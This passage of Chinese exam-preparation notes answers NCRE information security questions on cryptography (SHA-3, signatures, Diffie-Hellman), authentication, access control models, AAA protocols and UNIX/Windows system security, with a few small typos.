<li>抗碰撞性</li>
<li>高灵敏性</li>
</ul>
<h1 id="简述-SHA3-的工作原理"><a href="#简述-SHA3-的工作原理" class="headerlink" title="简述 SHA3 的工作原理"></a>简述 SHA3 的工作原理</h1><p>使用海绵机构，分为两个阶段吸收阶段和压榨阶段</p>
<ul>
<li><p>吸收阶段</p>
<p>消息先被填充切块，切成长度为 r 的 t 个分组（记为$x<em>0,x_1,···,x</em>{t-1}$），依次输入到函数f中，输入 b 比特的值输出也是 b 比特的值（$b=r+c$），SHA3中吧固定取 <code>1600</code> ，函数每次运行会“吸收”掉一个长度为 r 的消息分组，函数 f 运行 t 次后，整个消息就被“吸收”了</p>
</li>
<li><p>压榨阶段</p>
<p>进入压榨阶段函数继续运行，但不再吸收消息分组，而是每次产生 r 个比特的输出值，直到输出值的长度满足算法需要为止，若 r 大于算法要求输出值的长度，则从压榨阶段的第一次输出中截取</p>
</li>
</ul>
<h1 id="简述数字签名的作用及数字签名体制的两个过程。数字签名要预先使用单向哈希函数进行处理的原因是什么？"><a href="#简述数字签名的作用及数字签名体制的两个过程。数字签名要预先使用单向哈希函数进行处理的原因是什么？" class="headerlink" title="简述数字签名的作用及数字签名体制的两个过程。数字签名要预先使用单向哈希函数进行处理的原因是什么？"></a>简述数字签名的作用及数字签名体制的两个过程。数字签名要预先使用单向哈希函数进行处理的原因是什么？</h1><p>数字签名是一种以电子形式存在于数据信息中、附件中或逻辑上与之有联系的数据中，用于鉴别数据签署人的身份，表明签署人认可数据信息中所含信息的技术</p>
<p>把明文当成密文由解密算法得到数据，在由加密算法将数据恢复成明文，由于加解密算法不可分割，数据不能被其他人伪造，签名者也不能否份</p>
<ul>
<li><p>签名过程</p>
<p>A用自己保密的解密密钥 $K<em>{dA}$ 对明文数据 M 进行签名: $S_A=D(M,K</em>{dA})$  （<strong>A 使用私钥对明文直接解密</strong>）</p>
<p>$S<em>A$ 为 A 对 M 的签名，若不需保密A直接将 $S_A$ 发送个用户B，若需要保密则 A 查阅 PKDB 查到 B 的公开加密密钥 $K</em>{eB}$ ，并用 $K<em>{eB}$ 对 $S_A$ 进行加密得到密文 C ： $C=E(S_A,K</em>{eB})$ ，最后 A 把 C 发送给 B 并将 $S_A$ 或 C <strong>留底</strong> （<strong>使用 B 的公钥对 $S_A$ 进行加密</strong>）</p>
</li>
<li><p>验证签名过程</p>
<p>B 收到后，若不是保密通信，则通过查阅 PKDB 查到 A 的公开加密密钥 $K<em>{eA}$ 用来对签名进行验证：$E(S_A,K</em>{eA})=E(D(M,K<em>{dA}),K</em>{eA})=M$ （<strong>使用 A 的公钥对 $S_A$ 加密得到明文数据</strong>）</p>
<p>若是保密通信，B 首先用自己的保密的解密密钥 $K<em>{dB}$ 对 C 解密，然后查阅 PKDB ，查到 A 的公开加密密钥 $K</em>{eA}$ 用 $K<em>{eA}$ 对签名进行验证：  $D(C,K</em>{dB})=D(E(S<em>A,K</em>{eB}),K<em>{dB})=S_A$  ；  $E(S_A,K</em>{eA})=E(D(M,K<em>{dA}),K</em>{eA})=M$ （<strong>B 使用自己的私钥解密得到 $S_A$ ，在用 A 的公钥对 $S_A$ 加密得到明文数据</strong>）</p>
<p>验证签名的过程就是恢复明文的过程。若能恢复出正确的M，说明$S_A$ 是  A 的签名</p>
<p>B 将收到的 $S_A$ 或 C <strong>留底</strong></p>
<p>B 给 A 回复 “收到M” 的签名回执，A收到回执后同样验证签名并留底</p>
<p>只有 A 拥有 $K<em>{dA}$ 且公开的 $K</em>{eA}$ 在计算上不能求出保密的解密密钥 $K<em>{dA}$ ，所以签名只能 A 进行，因此 $K</em>{dA}$ 相当于A的印章或指纹，而 $S_A$ 就是 A 对 M 的签名，对此 A <strong>不能抵赖</strong>，其他人也<strong>不能伪造</strong></p>
</li>
</ul>
<h1 id="简述在公钥体制下利用-Diffie-Hellman-方法产生共享密钥的方法"><a href="#简述在公钥体制下利用-Diffie-Hellman-方法产生共享密钥的方法" class="headerlink" title="简述在公钥体制下利用 Diffie-Hellman 方法产生共享密钥的方法"></a>简述在公钥体制下利用 Diffie-Hellman 方法产生共享密钥的方法</h1><p>Diffie-Hellman 是最典型的密钥交换协议算法，是一个匿名密钥交换协议</p>
<p>在 Diffie-Hellman 算法中有两个全局公开参数，分别是一个素数 p 和一个整数 g ，g 是 p 的原根。甲随机选取 b 计算出 $A=g^a\ mod\ p$ ，乙随机选取 b 计算出 $B=g^b\ mod\ p$ 甲乙交换 A 和 B ，分别计算出共享的密钥 $K=B^a\ mod\ p=A^a\ mod\ p$</p>
<p>甲： $K=B^a\ mod\ p=(g^b)^a\ mod\ p=g^ab\ mod\ p$</p>
<p>乙： $K=A^b\ mod\ p=(g^a)^b\ mod\ p=g^ab\ mod\ p$</p>
<p>必须确保协议运行过程中收到的信息来自真实的对方</p>
<h1 id="简述密钥分配的分类及各自的工作原理"><a href="#简述密钥分配的分类及各自的工作原理" class="headerlink" title="简述密钥分配的分类及各自的工作原理"></a>简述密钥分配的分类及各自的工作原理</h1><p>密钥分配方法：</p>
<ul>
<li>公开发布：用户将自己的公钥发给其他用户，或向某一团体广播（简单，但任何人都能伪造）</li>
<li>公用目录：建立一个公用的公钥动态目录，由一个可信的实体或组织来建立、维护及公钥分发（安全性更高，但公钥目录表可能被伪造，也易受到对手窜扰）</li>
<li>公钥授权：一个公钥管理机构负责建立、维护通信各方的公钥动态目录表，用户都可靠的知道管理机构的公开密钥，且只有管理机构知道相应的秘密密钥（比前面更安全，但可能存在瓶颈，也可能被窜扰）</li>
<li>公钥证书：用户通过公钥证书交换自己的公钥而无需与公钥管理机构联系，公钥证书管理机构(Certification Authority , CA) 为用户建立。用户可将自己的公开密钥通过公钥证书发给另一个用户，接收方可用 CA 的公钥对证书加以验证 （克服了公钥管理机构模式的不足）</li>
</ul>
<h1 id="什么是消息认证？为什么要进行消息认证？"><a href="#什么是消息认证？为什么要进行消息认证？" class="headerlink" title="什么是消息认证？为什么要进行消息认证？"></a>什么是消息认证？为什么要进行消息认证？</h1><p>消息认证：验证所收到的消息确实来自真正的发送方，并且未被篡改的过程</p>
<p>消息认证是为了防止：伪装、内容修改、顺序修改、计时修改</p>
<h1 id="消息认证的方法有哪些？为什么人们一直用哈希函数而不用对称密码来构造消息认证？"><a href="#消息认证的方法有哪些？为什么人们一直用哈希函数而不用对称密码来构造消息认证？" class="headerlink" title="消息认证的方法有哪些？为什么人们一直用哈希函数而不用对称密码来构造消息认证？"></a>消息认证的方法有哪些？为什么人们一直用哈希函数而不用对称密码来构造消息认证？</h1><ul>
<li>消息加密 ：整个消息的密文作为认证码</li>
<li>消息认证码：利用密钥生成一个固定长度的数据块，将该数据块附加在消息后</li>
<li>哈希函数：是一种消息认证码的变形，通过输入可变大小的消息 m ，输出固定大小的哈希值 H(m)</li>
</ul>
<p>哈希值是所有消息位的函数，它具有错误检测能力，即改变消息的任何一位或多位都会导致哈希值的改变</p>
<h1 id="简述基于-DES-的消息认证码的生成算法"><a href="#简述基于-DES-的消息认证码的生成算法" class="headerlink" title="简述基于 DES 的消息认证码的生成算法"></a>简述基于 DES 的消息认证码的生成算法</h1><p>MAC 算法是基于 DES 的使用最广泛的 MAC 算法之一，满足保密性和安全性</p>
<p>将需认证的数据分成大小为 64 位的分组 $D_1 ||D_2||···||D_N$ 若最后分组不足 64 位，则在其后填 0 直至成为 64 位。然后基于密文反馈链接(CBC) 的分组密码工作模式计算得到认证码</p>
<h1 id="简述身份认证的协议"><a href="#简述身份认证的协议" class="headerlink" title="简述身份认证的协议"></a>简述身份认证的协议</h1><ul>
<li>基于口令的认证：口令是双方预先约定的秘密数据，用来验证用户知道什么</li>
<li>基于对称密码的认证：建立一个鉴别服务器的可信权威机构密钥分发中心（KDC），拥有每个用户的秘密密钥，想通信则用户向鉴别服务器中申请会话密钥（两人共用一个密钥），在会话密钥的分配过程中，身份得到鉴别</li>
<li>基于公钥密码的认证<ul>
<li>双方知道对方的公钥：直接使用公私钥生成和验证签名</li>
<li>算法不知道对方的公钥：经第三方可信的公钥保存库获得对方的公钥，然后生成签名与验证签名</li>
</ul>
</li>
</ul>
<h1 id="描述使用-DES-算法实现的一次性口令的算法"><a href="#描述使用-DES-算法实现的一次性口令的算法" class="headerlink" title="描述使用 DES 算法实现的一次性口令的算法"></a>描述使用 DES 算法实现的一次性口令的算法</h1><p>系统生成一个随机数 r ，并对其进行加密得到 $E_K(r)$ ，将 $EK(r)$ 提供给用户，用户计算 $E_K(D_K(E_K(r))+1)$ ，并将值返回给系统，同时系统计算 $r+1$ ，系统将用户返回的值与系统自己计算的值进行比较，相等则系统认为用户为真，系统和用户必须持有相同的密钥</p>
<h1 id="描述基于公钥密码的单向和双向身份认证过程"><a href="#描述基于公钥密码的单向和双向身份认证过程" class="headerlink" title="描述基于公钥密码的单向和双向身份认证过程"></a>描述基于公钥密码的单向和双向身份认证过程</h1><ul>
<li><p>单向身份认证：双方知道对方的公钥</p>
<ul>
<li><p>A 发送一个随机数 $r_a$ 给 B</p>
</li>
<li><p>B 产生随机数 $r_b$ , 将自己的证书 $Cert_b$ 、 $r_b$ 及 用私钥对随机数签名信息发给 A </p>
<p>若需要双向认证 A 将自己的证书 $Cert_a$ 以及使用私钥签名的信息发给 B</p>
</li>
</ul>
</li>
<li><p>双向身份认证：双不知道对方的公钥</p>
<ul>
<li>需要一个可信的第三方 T  保存公钥</li>
<li>A 向 T 发送将要通信的对象 B</li>
<li>P 将用 T 私钥签名的 B 公钥 $K_b$ 、用 P 私钥签名的 A 公钥 $K_a$  发送给 A ，A 可用 P 的公钥验证签名</li>
<li>A 生成一个随机回话密钥 K 用自己的私钥对 K 和一个时间标记 $T_a$ 进行签名后，用 B 的公钥对该签名加密 ，并将第三方给两者的公钥的签名一起发送给 B</li>
</ul>
</li>
</ul>
<h1 id="简述数字签名的产生和验证过程"><a href="#简述数字签名的产生和验证过程" class="headerlink" title="简述数字签名的产生和验证过程"></a>简述数字签名的产生和验证过程</h1><ul>
<li><p>签名过程</p>
<p>A用自己保密的解密密钥 $K<em>{dA}$ 对明文数据 M 进行签名: $S_A=D(M,K</em>{dA})$  （<strong>A 使用私钥对明文直接解密</strong>）</p>
<p>$S<em>A$ 为 A 对 M 的签名，若不需保密A直接将 $S_A$ 发送个用户B，若需要保密则 A 查阅 PKDB 查到 B 的公开加密密钥 $K</em>{eB}$ ，并用 $K<em>{eB}$ 对 $S_A$ 进行加密得到密文 C ： $C=E(S_A,K</em>{eB})$ ，最后 A 把 C 发送给 B 并将 $S_A$ 或 C <strong>留底</strong> （<strong>使用 B 的公钥对 $S_A$ 进行加密</strong>）</p>
</li>
<li><p>验证签名过程</p>
<p>B 收到后，若不是保密通信，则通过查阅 PKDB 查到 A 的公开加密密钥 $K<em>{eA}$ 用来对签名进行验证：$E(S_A,K</em>{eA})=E(D(M,K<em>{dA}),K</em>{eA})=M$ （<strong>使用 A 的公钥对 $S_A$ 加密得到明文数据</strong>）</p>
<p>若是保密通信，B 首先用自己的保密的解密密钥 $K<em>{dB}$ 对 C 解密，然后查阅 PKDB ，查到 A 的公开加密密钥 $K</em>{eA}$ 用 $K<em>{eA}$ 对签名进行验证：  $D(C,K</em>{dB})=D(E(S<em>A,K</em>{eB}),K<em>{dB})=S_A$  ；  $E(S_A,K</em>{eA})=E(D(M,K<em>{dA}),K</em>{eA})=M$ （<strong>B 使用自己的私钥解密得到 $S_A$ ，在用 A 的公钥对 $S_A$ 加密得到明文数据</strong>）</p>
<p>验证签名的过程就是恢复明文的过程。若能恢复出正确的M，说明$S_A$ 是  A 的签名</p>
<p>B 将收到的 $S_A$ 或 C <strong>留底</strong></p>
<p>B 给 A 回复 “收到M” 的签名回执，A收到回执后同样验证签名并留底</p>
<p>只有 A 拥有 $K<em>{dA}$ 且公开的 $K</em>{eA}$ 在计算上不能求出保密的解密密钥 $K<em>{dA}$ ，所以签名只能 A 进行，因此 $K</em>{dA}$ 相当于A的印章或指纹，而 $S_A$ 就是 A 对 M 的签名，对此 A <strong>不能抵赖</strong>，其他人也<strong>不能伪造</strong></p>
</li>
</ul>
<h1 id="举例说明访问控制中主体和客体，简述访问控制模型的分类及其优缺点"><a href="#举例说明访问控制中主体和客体，简述访问控制模型的分类及其优缺点" class="headerlink" title="举例说明访问控制中主体和客体，简述访问控制模型的分类及其优缺点"></a>举例说明访问控制中主体和客体，简述访问控制模型的分类及其优缺点</h1><ul>
<li>主体：一个<strong>主动</strong>的实体，提供对客体中的对象或数据的访问要求（可以是能访问信息的用户、程序、进程）</li>
<li>客体：含有被访问信息的<strong>被动</strong>实体</li>
</ul>
<ul>
<li>自主访问控制（DAC）:也叫任意访问控制，根据自主访问控制策略建立的一种模型，允许合法用户以用户或用户组的身份访问策略规定的客体，同时阻止非授权用户访问客体<ul>
<li>优点：根据主体的身份和访问权限进行决策；具有某种访问能力的主体能够自主地将访问权限的某个子集授予其他主体；灵活性高，被大量使用</li>
<li>缺点：信息在传递的过程中其访问权限关系会被改变</li>
</ul>
</li>
<li>强制访问控制（MAC）：强加给访问主体的，系统强制主体服从访问控制政策。主要特征是对所有主体及其控制的客体实施强制访问控制</li>
</ul>
<h1 id="举例说明访问能力表和访问控制表的应用"><a href="#举例说明访问能力表和访问控制表的应用" class="headerlink" title="举例说明访问能力表和访问控制表的应用"></a>举例说明访问能力表和访问控制表的应用</h1><ul>
<li>访问能力表(CL)：基于矩阵 <strong>行</strong> 的访问控制信息表</li>
<li>访问控制表(ACL)：基于矩阵 <strong>列</strong> 的访问控制信息表</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">-</th>
<th style="text-align:center">ACL</th>
<th style="text-align:center">CL</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">保存位置</td>
<td style="text-align:center">客体</td>
<td style="text-align:center">主体</td>
</tr>
<tr>
<td style="text-align:center">浏览访问权限</td>
<td style="text-align:center">容易</td>
<td style="text-align:center">困难</td>
</tr>
<tr>
<td style="text-align:center">访问权限传递</td>
<td style="text-align:center">困难</td>
<td style="text-align:center">容易</td>
</tr>
<tr>
<td style="text-align:center">访问权限回收</td>
<td style="text-align:center">容易</td>
<td style="text-align:center">困难</td>
</tr>
<tr>
<td style="text-align:center">使用</td>
<td style="text-align:center">集中式系统</td>
<td style="text-align:center">分布式系统</td>
</tr>
</tbody>
</table>
</div>
<h1 id="描述Bell-LaPadula-模型和-Biba-模型的工作原理和区别"><a href="#描述Bell-LaPadula-模型和-Biba-模型的工作原理和区别" class="headerlink" title="描述Bell-LaPadula 模型和 Biba 模型的工作原理和区别"></a>描述Bell-LaPadula 模型和 Biba 模型的工作原理和区别</h1><ul>
<li><p>Bell-LaPadula（BLP）模型：不上读、不下写原则（不允许低安全等级读高敏感信息，不允许高敏感信息写入低敏感区），安全等级：无密、秘密、机密、绝密</p>
<p>BLP存在不保护信息的完整性和可用性、不涉及访问控制等缺点</p>
</li>
<li><p>Biba模型：不下读、不上写原则（很重要级别能向重要级写入，但不能读取）保障数据的完整性，完整性级别：重要、很重要、极重要</p>
<p>Biba是BLP的补充，也使用了和BLP模型相似的安全级别划分方式，只不过Biba的划分方式是信息对象的完整性</p>
</li>
</ul>
<ul>
<li>Chinese Wall 模型是应用在多边安全系统中的安全模型（多个组织间访问控制系统）</li>
</ul>
<h1 id="简述-RADIUS-协议-、-TACACS-协议以及-Diameter-协议的区别"><a href="#简述-RADIUS-协议-、-TACACS-协议以及-Diameter-协议的区别" class="headerlink" title="简述 RADIUS 协议 、 TACACS 协议以及 Diameter 协议的区别"></a>简述 RADIUS 协议 、 TACACS 协议以及 Diameter 协议的区别</h1><ul>
<li>RADIUS 协议：拨号用户远程认证服务，一种网络协议，提供集中式 AAA 管理。一个客户端/服务器协议，运行在应用层，使用 UDP 协议，身份认证和授权使用1812端口，审计使用1813端口</li>
<li>TACACS协议：终端访问控制器访问控制系统，允许远程访问服务器传递用户登录密码给认证服务器，认证服务器决定该用户是否可以登录系统。使用传输控制协议（TCP）</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>-</th>
<th>RADIUS</th>
<th>TACACS+</th>
</tr>
</thead>
<tbody>
<tr>
<td>包传输</td>
<td>UDP</td>
<td>TCP</td>
</tr>
<tr>
<td>包加密</td>
<td>仅加密在RADIUS客户端和服务端间传送的密码</td>
<td>加密客户端服务端间的所有流量</td>
</tr>
<tr>
<td>AAA支持</td>
<td>组合认证与授权服务</td>
<td>使用AAA体系机构，分隔认证、授权和审计</td>
</tr>
<tr>
<td>多协议支持</td>
<td>在PPP连接上工作</td>
<td>支持其他协议，如：AppleTalk、NetBIOS和IPX</td>
</tr>
<tr>
<td>响应</td>
<td>在认证时使用适用于所有AAA活动的单质响应</td>
<td>对每一个AAA进程使用多质响应，每个AAA活动必须进行认证</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>Diameter协议：是 RADIUS 协议的升级版，支持移动IP、NAS请求和移动代理的认证、授权和审核工作，协议的实现和 RADIUS 类似，但采用 TCP 协议，支持分布式审计，客服了 RADIUS 的许多缺点，是最适合未来移动通信系统的 AAA 协议</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>-</th>
<th>RADIUS</th>
<th>Diameter</th>
</tr>
</thead>
<tbody>
<tr>
<td>模式</td>
<td>固有的客户端/服务器模式，限制了进一步发展</td>
<td>端到端模式，任何一段都可发送消息发起审计等功能或中断连接</td>
</tr>
<tr>
<td>传输机制</td>
<td>运行在UDP协议上，且没有重传机制</td>
<td>运行在可靠的TCP、SCTP协议上</td>
</tr>
<tr>
<td>失败恢复机制</td>
<td>不支持</td>
<td>支持应用层确定，定义了失败恢复算法和相关的状态机，能立即检测出传输错误</td>
</tr>
<tr>
<td>服务器初始化信息</td>
<td>服务器不能主动发起消息，只能客户能发出重授权请求，所有服务器不能根据需要重新认证</td>
<td>指定了两种消息类型（重认证请求和重认证应答消息）使得服务器可以随时根据需要主动发起重认证</td>
</tr>
<tr>
<td>认证和授权</td>
<td>必须成对出现</td>
<td>认证和授权分离，重授权可随时根据需求进行</td>
</tr>
<tr>
<td>安全机制</td>
<td>仅在应用层定义了一定的安全机制，没有涉及数据的机密性</td>
<td>要求必须支持IPsec以确保数据的机密性和完整性</td>
</tr>
</tbody>
</table>
</div>
<h1 id="简述单点登录机制及其实现原理"><a href="#简述单点登录机制及其实现原理" class="headerlink" title="简述单点登录机制及其实现原理"></a>简述单点登录机制及其实现原理</h1><p>将不同系统和应用程序所需的访问控制功能抽离出来。用户在使用时只需要在统一的单点登录方案下进行一次验证，便可以访问到自己所需的网络、信息和其他资源</p>
<p>第一次访问时引导到认证系统进行登录，通过身份校验后给用户返回一个认证凭证 ticket ，用户再访问别的应用时将带着这个 ticket 作为自己的认证凭证，应用收到请求将 ticket 送到认证系统校验，检测 ticket 合法性，如果通过校验用户就不用再次登录就能访问别的应用系统了</p>
<p>所有应用系统共享一个身份认证系统</p>
<p>所有应用系统能够识别和提取 ticket 信息</p>
<h1 id="简述审计和监控的作用及审计系统的组成"><a href="#简述审计和监控的作用及审计系统的组成" class="headerlink" title="简述审计和监控的作用及审计系统的组成"></a>简述审计和监控的作用及审计系统的组成</h1><p>通过安全审计能记录系统被访问的过程以及系统保护机制的运行状态，发现试图绕过保护机制的行为及时发现用户身份的变化，报告并阻碍绕过保护机制的行为并记录相关过程，为灾难恢复提供信息等</p>
<p>安全监控通过实时监控网络或主机活动，监控分析用户和系统的行为，审计系统配置和漏洞，评估敏感系统和数据的完整性，识别攻击行为对异常行为进行统计和跟踪，识别违反安全法规的行为，使用诱骗服务器记录黑客行为等功能，使管理员有效地监视、控制和评估网络或主机系统</p>
<p>安全审计的两个目标：</p>
<ul>
<li>必须提供足够的信息使安全人员能将问题限制在局部，而信息量达不到以此为基础进行攻击</li>
<li>优化审计记录的内容，审计分析机制应可以对一些特定资源辨识正常的行为</li>
</ul>
<p>升级系统通常由日志记录器、分析器、报告器 3 部分组成</p>
<h1 id="简述恶意行为审计与监控的实现方法及网络信息内容审计的方法"><a href="#简述恶意行为审计与监控的实现方法及网络信息内容审计的方法" class="headerlink" title="简述恶意行为审计与监控的实现方法及网络信息内容审计的方法"></a>简述恶意行为审计与监控的实现方法及网络信息内容审计的方法</h1><p>恶意行为的监控分为主机监测和网络监测</p>
<ul>
<li>主机监测：在用户主机上安装反病毒软件和基于主机的入侵监测软件，对入侵主机的已知恶意代码进行检测和预警</li>
<li>网络监测：在活动网路中被动监听网络流量，利用检测算法识别网络入侵行为</li>
</ul>
<p>网络监控的主要方法是网络舆情分析，网络信息内容审计主要用到：网络信息内容的获取（嗅探技术）和网络内容还原分析技术</p>
<p>网络舆情分析技术：舆情分析引擎，自动信息采集，数据清理</p>
]]></content>
      <categories>
        <category>NCRE</category>
      </categories>
      <tags>
        <tag>NCRE</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机等级考试三级信息安全技术章节习题3</title>
    <url>/posts/d8c74333/</url>
    <content><![CDATA[<p><strong>三、系统安全</strong></p>
<h1 id="CPU-的两种模式是什么？如何切换模式？操作系统如何利用-CPU-模式和保护环来实现安全保护？"><a href="#CPU-的两种模式是什么？如何切换模式？操作系统如何利用-CPU-模式和保护环来实现安全保护？" class="headerlink" title="CPU 的两种模式是什么？如何切换模式？操作系统如何利用 CPU 模式和保护环来实现安全保护？"></a>CPU 的两种模式是什么？如何切换模式？操作系统如何利用 CPU 模式和保护环来实现安全保护？</h1><p>内核模式和用户模式</p>
<p>操作系统运行在内核模式下，应用运行在用户模式下</p>
<p>用户模式转到内核模式的唯一方法是触发一个特殊的硬件 <strong>自陷</strong> ，如</p>
<ul>
<li>中断，通常是由外部硬件引发的，如 I/O 或时钟</li>
<li>异常，如除数为零、访问非法或不属于该进程的内存</li>
<li>显示地执行自陷命令</li>
</ul>
<p>内环中执行的进程比在外环中执行的进程有更高的权限，内环只允许最可信的组件和进程在其中执行，内环中执行的进程往往处于内核模式，在外环工作的进程侧处于用户模式。</p>
<p>保护环支持多任务操作系统所要求的可用性、完整性和机密性要求，进程运行所在的环编号越小，进程的可信度越高，常见保护环结构提供4个保护环：</p>
<ul>
<li>0 环：操作系统内核</li>
<li>1 环：操作系统的其他部分</li>
<li>2 环： I/O 驱动程序和实用工具</li>
<li>3 环：应用程序和用户活动</li>
</ul>
<a id="more"></a>
<h1 id="简述系统调用的实现"><a href="#简述系统调用的实现" class="headerlink" title="简述系统调用的实现"></a>简述系统调用的实现</h1><p>操作系统的内核中设置了一组用于实现各种特定系统功能的子程序（过程），它们被提供给应用程序调用。在编程过程中，需要系统完成特定的功能时，可以通过调用系统中特定的子程序完成，这就是系统调用</p>
<h1 id="进程管理如何实现？"><a href="#进程管理如何实现？" class="headerlink" title="进程管理如何实现？"></a>进程管理如何实现？</h1><p>管理单位：线程。进程管理实质上是对处理机执行时间的管理，进程是程序执行的一个实例，是运行着的程序。线程是为了节省资源而可以在同一进程中共享资源的一个执行单位。</p>
<p>操作系统维护一个进程表，其中每一项代表一个进程。表中包含每个进程的状态、堆栈指针、内存分配、程序计数器和打开文件的使用状况。</p>
<p>大多数CPU一次只执行一项任务。因此，系统会产生硬件和软件中断。当一个设备需要与 CPU 通信时，它必须等待它的中断信息被调。软件也同样如此，每个进程都有分配给它的中断信号。</p>
<p>进程管理是通过中断实现的。用于进程管理的定时器产生中断，则系统暂停当前代码执行进入经常管理程序。而进程管理程序则分析当前各进程的优先级和等待顺序，选择合适的进程，将 CPU 的时间片交个它。</p>
<h1 id="简述-UNIX-系统的守护进程"><a href="#简述-UNIX-系统的守护进程" class="headerlink" title="简述 UNIX 系统的守护进程"></a>简述 UNIX 系统的守护进程</h1><p>脱离于终端且在后台独立运行的进程，一个生存期较长的进程，通常独立于控制终端并且周期性地执行某种任务或等待处理某些发生的事件。系统引导装入时启动，在系统关闭时终止。大多数服务都通过守护进程实现，守护进程还能完成许多系统任务。</p>
<h1 id="UNIX-系统基于访问权限的文件保护是如何工作的？为实现该策略，共需要多少个访问权限位？为什么？"><a href="#UNIX-系统基于访问权限的文件保护是如何工作的？为实现该策略，共需要多少个访问权限位？为什么？" class="headerlink" title="UNIX 系统基于访问权限的文件保护是如何工作的？为实现该策略，共需要多少个访问权限位？为什么？"></a>UNIX 系统基于访问权限的文件保护是如何工作的？为实现该策略，共需要多少个访问权限位？为什么？</h1><p>每一个文件和目录有3组权限与之相关：文件拥有者、所属分组成员、其他所有用户</p>
<p>每组权限有3个权限标识位控制权限：</p>
<ul>
<li>可读（r）</li>
<li>可写（w），可写入或修改</li>
<li>可执行（x），可被执行或搜索</li>
</ul>
<p>这 9 位合起来被称为模式位（Mode Bits）。通常用一列10个字符来表示，每个字符表示一个模式设置，还有一位指明文件类型。</p>
<p><code>p</code> ：命名管道文件 ，<code>d</code> ：目录文件 , <code>l</code> ：符号连接文件 , <code>-</code> ：普通文件 , <code>s</code> ：socket文件 , <code>c</code> ：字符设备文件 ，<code>b</code> ：快设备文件</p>
<p>权限位可以用一个八进制数来表示。可读(ｒ) : <code>4</code> , 可写(w): <code>2</code> ，可执行 (x): <code>1</code> ,  无：<code>0</code></p>
<h1 id="UNIX-系统-Passwd-文件的作用是什么？如何删除一个用户？如何更改一个用户的密码？"><a href="#UNIX-系统-Passwd-文件的作用是什么？如何删除一个用户？如何更改一个用户的密码？" class="headerlink" title="UNIX 系统 Passwd 文件的作用是什么？如何删除一个用户？如何更改一个用户的密码？"></a>UNIX 系统 Passwd 文件的作用是什么？如何删除一个用户？如何更改一个用户的密码？</h1><p>用户的关键信息被存放在系统的 <code>/etc/passwd</code> 文件中。系统的每一个合法用户账号对应文件的一行记录，这行记录定义了每个用户账号的属性。</p>
<p>如果 <code>passwd</code> 字段中第一个字符是 <code>*</code> ，那表示该账号被查封，系统不允许该账号持有者登录。禁用账号在 <code>etc/passwd</code> 文件中用户名前 加<code>#</code></p>
<p>也可使用命令 <code>user del xxx</code> 直接删除用户</p>
<p>修改密码使用命令 <code>passwd xxx</code></p>
<h1 id="UNIX-Linux-系统中，服务的启动方式和禁用方式是什么？"><a href="#UNIX-Linux-系统中，服务的启动方式和禁用方式是什么？" class="headerlink" title="UNIX/Linux 系统中，服务的启动方式和禁用方式是什么？"></a>UNIX/Linux 系统中，服务的启动方式和禁用方式是什么？</h1><p><code>systemctl start/stop xxx</code></p>
<h1 id="简述-UNIX-系统的审计工具及其机制"><a href="#简述-UNIX-系统的审计工具及其机制" class="headerlink" title="简述 UNIX 系统的审计工具及其机制"></a>简述 UNIX 系统的审计工具及其机制</h1><p>UNIX\Linux 中，主要的审计工具是 syslogd 守护进程。通过配置可提供各种水平的系统审计和指定输出目录。</p>
<p><code>syslog.conf</code> 文件指明 syslogd 程序记录日志的行为，该程序在启动时查询配置文件。该文件由不同程序或消息分类的单个条目组成，每个占一行。对每类消息提供一个选择域和一个选择域，这些域由 tab 隔开。选择域指明消息的类型和优先级，动作域指明 syslogd 接收到一个与选择标准相匹配的消息时所执行的动作。</p>
<h1 id="简述-Windows-操作系统的系统架构和关键系统组件"><a href="#简述-Windows-操作系统的系统架构和关键系统组件" class="headerlink" title="简述 Windows 操作系统的系统架构和关键系统组件"></a>简述 Windows 操作系统的系统架构和关键系统组件</h1><p>用户模式和内核模式构成。用户应用程序代码在用户模式下运行，操作系统代码（如系统服务和设备驱动程序）在内核模式下运行。内核模式是处理器的一种执行模式，它允许访问所有的系统内存和所有的CPU指令。操作系统软件的特权级别级别高于应用程序软件，这样处理器就为操作系统的设计者提供了一个必要的基础，保证了应用程序的不当行为在总体上不会破坏系统的稳定性。</p>
<p>管系统组件：</p>
<ul>
<li>环境子系统和子系统动态链接库</li>
<li>执行体</li>
<li>内核</li>
<li>硬化抽象层</li>
<li>设备驱动程序</li>
<li>系统支持进程</li>
</ul>
<h1 id="简述-Windows-操作系统进程安全管理的方法"><a href="#简述-Windows-操作系统进程安全管理的方法" class="headerlink" title="简述 Windows 操作系统进程安全管理的方法"></a>简述 Windows 操作系统进程安全管理的方法</h1><ul>
<li>任务管理器：提供系统正在运行的程序和进程的相关信息，可以实现监视计算机性能、查看网络状态、终止已停止响应的程序等功能</li>
<li>Msinfo32：提供查看系统信息的工具，可以显示本地计算机上硬件、系统组件和软件环境的完整视图</li>
<li>DOS命令行</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>tasklist</td>
<td>查看进程命令，并能查看进程同服务的关系</td>
</tr>
<tr>
<td>taskkill</td>
<td>终止进程命令</td>
</tr>
<tr>
<td>netstat</td>
<td>可以用来查看进程，并能查看进程发起程序</td>
</tr>
<tr>
<td>ntsd</td>
<td>可以用来终止进程</td>
</tr>
</tbody>
</table>
</div>
<h1 id="简述-Windows-操作系统的启动过程"><a href="#简述-Windows-操作系统的启动过程" class="headerlink" title="简述 Windows 操作系统的启动过程"></a>简述 Windows 操作系统的启动过程</h1><ul>
<li>预引导阶段：通电自检，读取并运行主引导记录 MBR</li>
<li>引导阶段：初始化引导载入程序、操作系统选择、硬盘检测、硬件配置文件选择等4个步骤<ul>
<li>初始化引导载入程序：读取文件系统驱动并成功找到硬盘上的分区后，引导载入程序初始化完成</li>
<li>操作系统选择：读取 <code>boot.ini</code> 文件进行系统选择（多系统）</li>
<li>硬件检测：将所有硬件信息收集起来并列成一个表</li>
<li>配置文件选择</li>
</ul>
</li>
<li>载入内核阶段：载入 Windows 的内核文件 <code>ntoskrnl.exe</code></li>
<li>初始化内核阶段：创建 <code>Hardware</code> 注册表键、对 <code>Control Set</code> 注册表键进行复制、载入和初始化设备驱动、启动服务</li>
